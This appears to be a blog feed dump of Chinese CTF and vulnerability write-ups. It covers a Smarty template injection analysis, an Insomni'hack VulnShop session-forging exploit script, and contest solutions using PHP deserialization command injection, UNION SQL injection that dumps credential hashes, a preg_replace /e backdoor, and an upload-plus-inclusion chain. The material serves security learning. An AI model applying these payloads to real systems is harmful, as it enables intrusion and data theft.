漏洞分析参数通过$smarty-&gt;display(&#39;test:&#39;.$_GET[&#39;chybeta&#39;]);传入，display定义在 smarty_internal_templatebase.php 中，它调用了 _execute。 _execute定义在libs\sysplugins\smarty_internal_compile_assign.phpsmarty_internal_templatebase.php 的 156 行左右，在该方法定义中，也即整个文件的174行左右：1234# smarty_internal_templatebase.php# line about 175$template = $smarty-&gt;createTemplate($template, $cache_id, $compile_id, $parent ? $parent : $this, false); 会调用createTemplate方法，将我们的传入的参数创建成一个模板， 接着会调用render方法，进行模板渲染。1234# smarty_internal_templatebase.php# line about 174$result = $template-&gt;render(false, $function); render方法定义在libs\sysplugins\smarty_template_compiled.php中，第105行开始对前面生成的模板进行处理：123456# smarty_template_compiled# line about 104if (!$this-&gt;processed) &#123; $this-&gt;process($_template);&#125; process方法定义在第131行。现在初次访问，也即文件的第138行会对模板文件进行编译，即如简介中所言开始生成编译文件：123456789101112131415161718192021if (!$this-&gt;exists || $smarty-&gt;force_compile || ($smarty-&gt;compile_check &amp;&amp; $source-&gt;getTimeStamp() &gt; $this-&gt;getTimeStamp())) &#123; $this-&gt;compileTemplateSource($_smarty_tpl); $compileCheck = $smarty-&gt;compile_check; $smarty-&gt;compile_check = false; $this-&gt;loadCompiledTemplate($_smarty_tpl); $smarty-&gt;compile_check = $compileCheck;&#125;```compileTemplateSource`方法定义在同文件的第169行，在第181行装载完编译器后（loadCompiler()），调用write方法进行写操作：```phppublic function compileTemplateSource(Smarty_Internal_Template $_template)&#123; ... try &#123; // call compiler $_template-&gt;loadCompiler(); $this-&gt;write($_template, $_template-&gt;compiler-&gt;compileTemplate($_template)); &#125; ... 跟入compileTemplate方法，定义libs\sysplugins\smarty_internal_templatecompilerbase.php第334行：123456789101112public function compileTemplate(Smarty_Internal_Template $template, $nocache = null, Smarty_Internal_TemplateCompilerBase $parent_compiler = null)&#123; // get code frame of compiled template $_compiled_code = $template-&gt;smarty-&gt;ext-&gt;_codeFrame-&gt;create($template, $this-&gt;compileTemplateSource($template, $nocache, $parent_compiler), $this-&gt;postFilter($this-&gt;blockOrFunctionCode) . join('', $this-&gt;mergedSubTemplatesCode), false, $this); return $_compiled_code;&#125; create是生成编译文件代码的方法，定义在libs\sysplugins\smarty_internal_runtime_codeframe.php第28行，为显示变量情况，这里我加了一句var_dump 在第44行，在生成output内容时有如下代码：12$output .= "/* Smarty version " . Smarty::SMARTY_VERSION . ", created on " . strftime("%Y-%m-%d %H:%M:%S") . "\n from \"" . $_template-&gt;source-&gt;filepath . "\" */\n\n"; 将 $_template-&gt;source-&gt;filepath的内容直接拼接到了$output里。这段代码是为了生成编译文件中的注释，$output的头尾有注释符号/*和*/。 现在考虑如何利用，我们需要闭合前面的注释符号，即payload的最前面需要加上*/。同时还要把后面的*/给注释掉，可以在payload最后加上//。中间填上php代码即可。另外需要注意的是，在win平台下，文件名中不允许有*，而smarty框架的生成的编译文件的名字会含有我们的payload，所以在win下时会直接提示创建文件失败。 在linux平台下即可利用成功。 漏洞修补查看commit记录：https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61 添加了过滤，将可能闭合的*/变为* /： 在另外几处文件中也进行了过滤，要求只能出现字母和数字:1substr(preg_replace(&apos;/[^A-Za-z0-9.]/&apos;,&apos;&apos;,$source-&gt;name),0,25); 题外话直接看生成的编译文件，会发现有两个输出点，第二个输出点在单引号内，但这个无法逃逸。在libs\sysplugins\smarty_internal_runtime_codeframe.php的第47行，使用的是var_export来导出变量内容的值： $dec = &quot;\$_smarty_tpl-&gt;_decodeProperties(\$_smarty_tpl, &quot; . var_export($properties, true) . &#39;,&#39; . ($cache ? &#39;true&#39; : &#39;false&#39;) . &quot;)&quot;; $output .= &quot;if ({$dec}) {\n&quot;; 而如漏洞修补一节中所言，漏洞修补后，引号会被直接去除。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Insomni'hack teaser 2018-VulnShop-writeup]]></title>
      <url>%2F2018%2F01%2F21%2FInsomni-hack-teaser-2018-VulnShop-writeup%2F</url>
      <content type="text"><![CDATA[Insomni’hack teaser 2018-VulnShop-writeupsession文件 题目12345We&apos;re preparing a website for selling some important vulnerabilities in the future. You can browse some static pages on it, waiting for the official release.http://vulnshop.teaser.insomnihack.chImportant : you don&apos;t need to use automated scanners or bruteforce for this challenge, and using some will result for your ip to be banned. Go on IRC to ask for being unbanned. Solution题目提供了源码，和phpinfo 源码主要部分如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php if(isset($_GET['hl']))&#123; highlight_file(__FILE__); exit; &#125; error_reporting(0); session_start(); // Anti XSS filter $_REQUEST = array_map("strip_tags", $_REQUEST); // For later, when we will store infos about visitors. chdir("tmp");?&gt;&lt;?php switch($_GET['page']) &#123; case 'default': default: echo "&lt;p&gt;Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!&lt;/p&gt;"; break; case 'introduction': echo "&lt;p&gt;Our website will introduce some new vulnerabilities. Let's check it out later!&lt;/p&gt;"; break; case 'privacy': echo "&lt;p&gt;This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!&lt;/p&gt;"; break; case 'contactus': echo "&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"; $_SESSION['challenge'] = rand(100000,999999); break; case 'captcha': if(isset($_SESSION['challenge'])) echo $_SESSION['challenge']; // Will make an image later touch($_SESSION['challenge']); break; case 'captcha-verify':// verification functions take a file for later, when we'll provide more way of verification function verifyFromString($file, $response) &#123; if($_SESSION['challenge'] === $response) return true; else return false; &#125; // Captcha from math op function verifyFromMath($file, $response) &#123; if(eval("return ".$_SESSION['challenge']." ;") === $response) return true; else return false; &#125; if(isset($_REQUEST['answer']) &amp;&amp; isset($_REQUEST['method']) &amp;&amp; function_exists($_REQUEST['method']))&#123; $_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']); &#125; break; &#125;?&gt; 第一部分的php代码，对于接收进来的参数，都会进行strip_tags，将其中的html、php标签去除，同时开始了一个session_start。 第二部分中有几个功能： 当page=contactus时，会随机产生一个变量$_SESSION[&#39;challenge&#39;]。 当page=captcha时，若之前已经访问过contactus，也即对应的变量$_SESSION[&#39;challenge&#39;]存在，则echo出来，并且创建一个以变量$_SESSION[&#39;challenge&#39;]值为名字的文件，后面我简称用户的challenge文件。 当page=captcha-verify时，通过传入对应的参数，会执行如下代码：1$_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']) 同时在这个case中，还定义了两个函数，其中verifyFromMath()中出现了熟悉的eval。 通过基本的尝试，可以发现： 由于strip_tags的存在，无法直接传入包含&lt;?php等的php代码 tmp目录不可读，通过touch生成的文件也无法访问。 网站根目录（即tmp目录的上一级目录）不可写 考虑题目还给了phpinfo，经过查看，我们可以发现session文件的保存位置。 我们知道在php中，通过查看cookie可以知道对应的PHPSESSID，比如PHPSESSID=123456，则在对应的session文件名即为sess_123465。以下是我本地测试用例： 所以考虑一个场景： 我们生成两个用户，也即两个session，对应着两个PHPSESSID。 利用用户1和captcha-verify功能，将php语句写入到用户2的session文件中，要注意格式，修改用户2对应的$_SESSION[&#39;challenge&#39;] 利用用户2和verifyFromMath，执行eval(&quot;return &quot;.$_SESSION[&#39;challenge&#39;].&quot; ;&quot;)，从而执行我们的php代码。 第一步，两个用户。因此我们要分两次的分别访问contactus和captcha，记录下他们对应的PHPSESSID。 第二步中，先来看看session文件的格式。由于我们要写入的是php语句，因此格式如下：1challenge|s:7:&quot;chybeta&quot;; 其中s表示字符串，后面的数字7为长度，引号中的内容是对应的php语句，其余的部分不变，上述示例对应的$_SESSION[&#39;challenge&#39;]即为chybeta 接着考虑如何把这串内容写入到用户2的session文件中。源码中有这段代码：1$_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']) 因此我们先往用户1的challenge文件中写入对应php语句，即：1234$_REQUEST[&apos;method&apos;] = file_put_contents$_REQUEST[&apos;answer&apos;] = fake-session-contentfile_put_contents(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], fake-session-content) 这样在tmp目录下就生成了用户1对应的challenge文件，其内容为伪造的用户2的session文件内容。 接着覆盖:1234$_REQUEST[&apos;method&apos;] = rename$_REQUEST[&apos;answer&apos;] = path_to_user2_sessionrename(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], path_to_user2_session) pathto_user2_session是指用户2的session文件的路径，从phpinfo，我们知道session路径为`/var/lib/php/sessions/sess[对应的PHPSESSID]` 注意在整个第二步的操作过程中，我们没有关注用户1的session，它生成的challenge文件仅作为一个中转站。 第三步，执行php代码，注意这个时候用户2的session文件内容已经被改变了。这个时候需要进入verifyFromMath功能：123456$_REQUEST[&apos;method&apos;] = verifyFromMath$_REQUEST[&apos;answer&apos;] = xxxverifyFromMath(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], xxx) =&gt; eval(&quot;return &quot;.$_SESSION[&apos;challenge&apos;].&quot; ;&quot;) 利用exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import requestsimport redef filePutContent(cookie,payload): params = &#123; 'page':'captcha-verify', 'answer': payload, 'method':'file_put_contents' &#125; r = requests.get(url,params=params,cookies=cookie) print('[*] file_put_contents ok.')def rename(r1_cookie,r2_phpsessid,session_path): cookie2_session_file = session_path + "sess_" + r2_phpsessid print('[*] r2 session file path: ' + cookie2_session_file) params = &#123; 'page':'captcha-verify', 'answer': cookie2_session_file, 'method':'rename' &#125; r = requests.get(url,params=params,cookies=r1_cookies) print('[*] rename ok.')def getResult(cookie): verifyurl = url + "?page=captcha-verify" postdata = &#123; "method":"verifyFromMath", "answer":"a" &#125; p = re.compile("(?&lt;=&lt;div class=\"content\"&gt;)(.*?)(?=&lt;/div&gt;)",re.S) r = requests.post(verifyurl,data=postdata,cookies=cookie) result = re.search(p,r.text).group(0) return result.strip()url = "http://vulnshop.teaser.insomnihack.ch/index.php"session_path = "/var/lib/php/sessions/"contactus = &#123; 'page':'contactus'&#125;captcha = &#123; 'page':'captcha'&#125;r1 = requests.get(url,params=contactus)r1_cookies = r1.cookiesr1_phpsessid = r1.cookies['PHPSESSID']print('[*] r1 PHPSESSID: ' + r1_phpsessid)r2 = requests.get(url,params=contactus)r2_cookies = r2.cookiesr2_phpsessid = r2.cookies['PHPSESSID']print('[*] r2 PHPSESSID: ' + r2_phpsessid)while True: payload = input("[*] php code:") length = len(payload) content = 'challenge|s:%d:"%s";' % (length,payload) filePutContent(r1_cookies,content) rename(r1_cookies,r2_phpsessid,session_path) print('[*] eval result:' + getResult(r2_cookies)) php code:1print_r(scandir(&apos;/&apos;)); php code:1print_r(file_get_contents(&apos;/flag&apos;)); flag:1INS&#123;4rb1tr4ry_func_c4ll_is_n0t_s0_fun&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[赛博地球杯工业互联网安全大赛-Web-writeup]]></title>
      <url>%2F2018%2F01%2F18%2F%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup%2F</url>
      <content type="text"><![CDATA[为什么比赛要办在考试周。。一些题是比赛完后做的，暂时只写了部分题的wp。 大量设备报表不见了（签道题）题目12云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。http://120.27.14.73:20006/ Solution报表中心有链接，发现url为1http://120.27.14.73:20006/index.php?id=1 不是sql注入，尝试爆破。当id=2333时： 1flag&#123;2333_bao_pO_OOOO0o_o0OOO&#125; 工控系统的敏感消息遭泄漏题目12云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。http://47.104.99.231:20003/ Solution存在git泄露，用githack下载源码进行审计。 index2.php中，有如下代码：123456789101112131415161718192021$secret = $_GET['secret'];$ad = $_GET['ad'];if(isset($ad))&#123; if(ereg("^[a-zA-Z0-9]+$", $ad) === FALSE) &#123; echo '&lt;script&gt;alert("Sorry ! Again !")&lt;/script&gt;'; &#125; elseif(strpos($ad, '--') !== FALSE) &#123; echo "Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;"; if (stripos($secret, './') &gt; 0) &#123; die(); &#125; unserialize($secret); &#125; else &#123; echo '&lt;script&gt;alert("Sorry ! You must have --")&lt;/script&gt;'; &#125; &#125; ereg，可以用%00绕过，然后再让--出现在%00的后面，即可进入第二个分支，进行反序列操作。在进行反序列化之前，进行了判断，不允许$secret中出现./ 在class.php中，定义了如下类： 12345678910111213141516171819202122232425262728293031&lt;?phpclass Record&#123; public $file="Welcome"; public function __construct($file) &#123; $this-&gt;file = $file; &#125; public function __sleep() &#123; $this-&gt;file = 'sleep.txt'; return array('file'); &#125; public function __wakeup() &#123; $this-&gt;file = 'wakeup.txt'; &#125; public function __destruct() &#123; if ($this-&gt;file != 'wakeup.txt' &amp;&amp; $this-&gt;file != 'sleep.txt' &amp;&amp; $this-&gt;file != 'Welcome') &#123; system("php ./import/$this-&gt;file.php"); &#125;else&#123; echo "&lt;?php Something destroyed ?&gt;"; &#125; &#125;&#125; 在__destruct阶段，进行了system操作，但在反序列化时__wakeup方法的调用会设置file为wakeup.txt，CVE-2016-7124中提到可以如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。因此可以绕过，也即file字段可控，且没有过滤。 由前分析，由于不允许出现./，我们考虑先获得绝对路径。 在class.php中，将sleep方法注释掉，在尾部添加 123$b =new Record('Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf');$c = serialize($b);echo $c; 这样在执行时即执行：1system(&quot;php ./import/Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf.php&quot;); pwd是为了获取当前路径，之后的是因为有一个.php的后缀。得到；1O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125; 修改为：1O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125; url编码后访问：1http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A33%3A%22Flag.php%20%26%26%20pwd%20%26%26%20pwd%20%26%26%20cat%20waf%22%3B%7D 获得绝对路径为/var/www/html。 123$b =new Record(&apos;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&apos;);$c = serialize($b);echo $c; 得到：1O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125; 修改为：1O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125; url编码，访问：1http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A48%3A%22Flag.php%20%26%26%20pwd%20%26%26%20cat%20%2fvar%2fwww%2fhtml%2fimport%2fFlag%22%3B%7D flag如下：1flag&#123;g_i_i_t_is_unsafe_ahhhahahah&#125; 工控管理系统新版本题目12云工控管理系统新添加的登录和注册页面存在漏洞，请找出flag。http://47.104.1.173:20004/ Solutionfindpwd.php有注入漏洞1234POST:username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#information_schema&lt;br&gt;cetc004&lt;br&gt;mysql&lt;br&gt;performance_schema&lt;br&gt; 1234username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x63657463303034)),32#admin&lt;br&gt;user&lt;br&gt; 123username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e)),32#username&lt;br&gt;password&lt;br&gt;question&lt;br&gt;answer&lt;br&gt; 123username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer)+FROM+cetc004.admin)),32#c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds 12345678username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer+SEPARATOR+0x3c62723e)+FROM+cetc004.user)),32#c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds&lt;br&gt;1 c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;admin c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;root c81e728d9d4c2f636f067f89cc14862c 1 1&lt;br&gt;&apos; 024c94d6e03b6f67a86b952b914816c7 &apos; &apos;&lt;br&gt;xxoo e10adc3949ba59abbe56e057f20f883e 123456 123456 工控云管理系统设备维护中心被植入后门题目12其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统http://47.104.74.209:20005 Solution利用page参数和php伪协议读取源码 123456789GET /index.php?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1Host: 47.104.74.209:20005User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986Connection: closeUpgrade-Insecure-Requests: 1 得到index.php源码，其中第121行：1234567891011121314151617//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo "&lt;br &gt;Welcome My Admin ! &lt;br &gt;"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125; 这里存在后门，添加头部和对应GET字段。12345678910GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;ls&apos;)&amp;sub=aa HTTP/1.1Host: 47.104.74.209:20005User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0X-Forwarded-For: 127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986Connection: closeUpgrade-Insecure-Requests: 1 发现一个目录s3chahahaDir，之后还有一个目录flag，里面有flag.php 12345678910GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;cat+s3chahahaDir/flag/flag.php&apos;)&amp;sub=aa HTTP/1.1Host: 47.104.74.209:20005User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0X-Forwarded-For: 127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986Connection: closeUpgrade-Insecure-Requests: 1 得到flag：1flag&#123;SecuriTY_Preg_eee3&#125; 工控云管理系统客服中心期待您的反馈题目1234工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面http://47.104.188.226:20001请找到这个隐藏的文件，swp？不不不。。。再找找。。 Solution有一个上传功能：1http://47.104.188.226:20001/includes/upload.php 存在swn,swo,swp文件泄露：123http://47.104.188.226:20001/.index.php.swphttp://47.104.188.226:20001/.index.php.swohttp://47.104.188.226:20001/.index.php.swn 但实际上只有swo，可以直接看到源码：view-source:http://47.104.188.226:20001/.index.php.swo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phperror_reporting(0);ini_set('open_basedir', '/var/www/html');function autoload($page) &#123; if (stripos($_SERVER['QUERY_STRING'], 'flag') &gt; 0) &#123; die('no flag flag flag flag !'); &#125; if (stripos($_SERVER['QUERY_STRING'], 'uploaded') &gt; 0) &#123; die('no uploaded uploaded uploaded uploaded !'); &#125; if (stripos($_SERVER['QUERY_STRING'], '://f') &gt; 0) &#123; die('no ://f ://f ://f'); &#125; if (stripos($_SERVER['QUERY_STRING'], 'ata') &gt; 0) &#123; die('no ata ata ata'); &#125; if (stripos($_SERVER['QUERY_STRING'], '0') &gt; 0) &#123; die('no 0 0 0'); &#125; if(file_exists("./includes/$page.php")) &#123; include "./includes/$page.php"; &#125; elseif(file_exists("./includes/$page")) &#123; include "./includes/$page"; &#125;else&#123; echo "File is not exit "; &#125;&#125;function download($adfile, $file)&#123; //Only Administrators can download files . $cert = 'N'; if(isset($adfile) &amp;&amp; file_get_contents($adfile, 'r') === 'Yeah Everything Will Be Ok My Boss') &#123; echo "Welcome ! You Are Administrator !"; $cert = 'Y'; &#125;else&#123; echo "error1"; &#125; if ($cert === 'Y')&#123; if (stripos($file, 'file_list') != false) die('error4'); if (stripos($file, 'file_list') &gt;= 0) &#123; header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename='. basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); &#125;else&#123; die('error2'); &#125;&#125;else&#123; echo 'error3';&#125;&#125;if(!isset($_GET['page'])) &#123; $page = 'index';&#125;else &#123; $page = $_GET['page'];&#125;if (stripos($page, './') &gt; 0) &#123; die('no ./ ./ ./ ./');&#125;if (stripos($page, '://') &gt; 0) &#123; die('no :// :// ://');&#125;autoload($page);if (isset($_GET[admin]) &amp;&amp; isset($_GET[file])) &#123; if (stripos($_GET[admin], 'flag') &gt; 0 || stripos($_GET[file], 'flag') &gt; 0) &#123; die('not flag flag flag falg !'); &#125; if (strlen($_GET[file]) &gt;= 38) &#123; die('too long'); &#125; download($_GET[admin], $_GET[file]);&#125;?&gt; 上面这个是index.php的源码，分析起来两个功能： autoload功能，这里提供了一个文件包含，但需要绕过许多限制，后面再说。 download功能，提供了文件下载功能。 先利用download功能。在最下面，接受了两个参数admin和file。在download函数中，对admin参数做了检测:1if(isset($adfile) &amp;&amp; file_get_contents($adfile, &apos;r&apos;) === &apos;Yeah Everything Will Be Ok My Boss&apos;) 结合题目里有上传功能，我们访问：1234http://47.104.188.226:20001/index.php?admin=php://input&amp;file=includes/upload.phpPOST:Yeah Everything Will Be Ok My Boss 从而获得了upload.php的源码:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 &lt;?php if (stripos($_SERVER['QUERY_STRING'], 'flag') &gt; 0) &#123; die('no flag flag flag flag !'); &#125; if (!empty($_FILES)) &#123; //properties of the uploaded file $name= $_FILES["filename"]["name"]; $type= $_FILES["filename"]["type"]; $size= $_FILES["filename"]["size"]; $temp= $_FILES["filename"]["tmp_name"]; $error= $_FILES["filename"]["error"]; if (strlen($name) &gt;= 6) &#123; die('name is too long !'); &#125; if (stripos($name, './') &gt; 0) &#123; die('invalid parameter'); &#125; if (stripos($name, 'php') &gt; 0) &#123; die('invalid parameter'); &#125; if (substr($name, -3, 3) !== 'zip' &amp;&amp; substr($name, -3, 3) !== 'jpg' &amp;&amp; substr($name, -3, 3) !== 'png') &#123; die('file can not upload ! '); &#125; if ($error &gt; 0) die("Error uploading file! code $error."); else &#123; if($type !== "application/zip" || $size &gt; 400)//condition for the file &#123; die("Format not allowed or file size too big!"); &#125; else &#123; if(file_exists('includes'))&#123; move_uploaded_file($temp, "includes/uploaded/" .$name); echo "Upload complete a!"; shell_exec('sh /var/www/html/includes/unzip.sh'); &#125;elseif(file_exists('uploaded'))&#123; move_uploaded_file($temp, "uploaded/" .$name); echo "Upload complete!"; shell_exec('sh /var/www/html/includes/unzip.sh'); &#125; &#125; &#125; &#125;else&#123; if(isset($_GET['step']) &amp;&amp; strlen($_GET['step']) === 20) &#123; if (stripos($_GET['step'], 'lag') &gt; 0) &#123; die('error'); &#125; if (stripos($_GET['step'], './') &gt; 0) &#123; die('error'); &#125; if (stripos($_GET['step'], ' ') &gt; 0) &#123; die('error'); &#125; if (stripos($_GET['step'], '/') &gt; 0) &#123; die('error'); &#125; if (preg_match('/[^\w\d_ -]/si', $_GET['step'])) &#123; $_GET['step'] = preg_replace('/[^a-zA-Z0-9_ -]/s', '', $_GET['step']); die('error'); &#125; passthru('cat ' . 'uploaded/' . $_GET['step']); &#125;else&#123; die(); &#125; &#125;?&gt; 接下来审计upload.php，可以看到允许上传zip文件，里面有这么一段代码：123456789if(file_exists('includes'))&#123; move_uploaded_file($temp, "includes/uploaded/" .$name); echo "Upload complete a!"; shell_exec('sh /var/www/html/includes/unzip.sh');&#125;elseif(file_exists('uploaded'))&#123; move_uploaded_file($temp, "uploaded/" .$name); echo "Upload complete!"; shell_exec('sh /var/www/html/includes/unzip.sh');&#125; 调用了unzip.sh，访问http://47.104.188.226:20001/includes/unzip.sh ,得到代码：123456789101112#/bin/bashcd ./uploadedfind ./ -size +1M | xargs rmcd ../unzip -o ./uploaded/*.zip -d ./uploaded/rm -rf ./uploaded/*.ziprm -rf ./uploaded/*.*rm -rf ./uploaded/.*cd ./uploadedfind -type d | xargs rm -rftouch /var/www/html/includes/uploaded/index.phpchmod 000 /var/www/html/includes/uploaded/index.php sh脚本会将zip包解压缩到当前目录的uploaded目录下，接着删除符合规则的三种文件和目录。最后创建index.php，并设置权限位。 综上，我们构造一个压缩包，使之解压后不被删除，同时结合index.php的page参数的文件包含功能，即可获得shell。 文件chybeta内容：123&lt;?phpsystem(&apos;cat flag/flag/flag/flag/flag/flag/flag.php&apos;);?&gt; 压缩后为c.zip，在上传时抓包，将type改为application/zip。 上传成功后，会执行unzip.sh，即可解压出压缩包的内容，比如访问http://47.104.188.226:20001/includes/uploaded/chybeta 接着考虑如何包含uploaded目录下的chybeta文件。在index.php中，123if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;uploaded&apos;) &gt; 0) &#123; die(&apos;no uploaded uploaded uploaded uploaded !&apos;);&#125; 由于这里是用$_SERVER[&#39;QUERY_STRING&#39;]，并且用stripos来定位，所以当我们访问1http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/chybeta $_SERVER[&#39;QUERY_STRING&#39;]即为uploaded&amp;page=uploaded/chybeta，strpos的值为0，从而绕过了检测。 flag:1flag&#123;CVE_SomeThing_aBout_gitLab&#125; YUNWAF的突破_青云题目12345工控云管理系统新版本，有防护了。不知道防护有没有用。http://qcloudcetc.xctf.org.cn:8099`## Solution当用户名过长时，即可绕过waf，这里a的个数为886个： username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32# result:information_schema cetCCHqy004 mysql performance_schema123![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/8.jpg?raw=true)最后payload： 